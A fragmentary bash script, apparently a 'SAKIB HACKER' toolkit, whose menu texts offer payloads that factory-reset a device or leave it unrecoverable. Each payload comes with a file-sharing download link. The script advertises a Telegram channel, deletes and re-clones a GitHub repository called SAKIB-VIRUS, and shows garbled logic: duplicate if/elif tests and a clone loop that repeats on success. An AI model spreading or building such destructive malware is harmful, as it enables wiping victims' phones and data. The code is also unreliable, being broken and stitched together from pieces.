...
'
echo " " 
echo -e "$red #$pink SAKIB HACKER$grn $red#$rset"
echo 
# Functions
...
device it will be factory reset and lot more happens.
         ...
         \e[92mL1NK :- \e[96mhttps://we.tl/t-Z3KidSe9vV\e[91m
...
device will not be recovered.(Antivirus)
        ...
        \e[92mL1NK :- \e[96mhttps://we.tl/t-Z3KidSe9vV\e[93m
...
echo -e "\e[93m             ADMIN OF \e[92mSAKIB HACKER" | pv -qL 10
echo -e "\e[93m             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
echo -e "\e[93m         Keep Supporting And Join Us " | pv -qL 10
echo -e "\e[93m         Join Us:\e[92m https://t.me/UPS4K1B \e[0m" | pv -qL 10
...
upd(){
if [ -d "$HOME/SAKIB-VIRUS" ];
then
cd $HOME
rm -rf SAKIB-VIRUS
elif [ -d "$HOME/SAKIB-VIRUS" ];
then
cd $HOME
rm -rf SAKIB-VIRUS
else
...
while git clone https://github.com/S4K1BK1NG/SAKIB-VIRUS 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
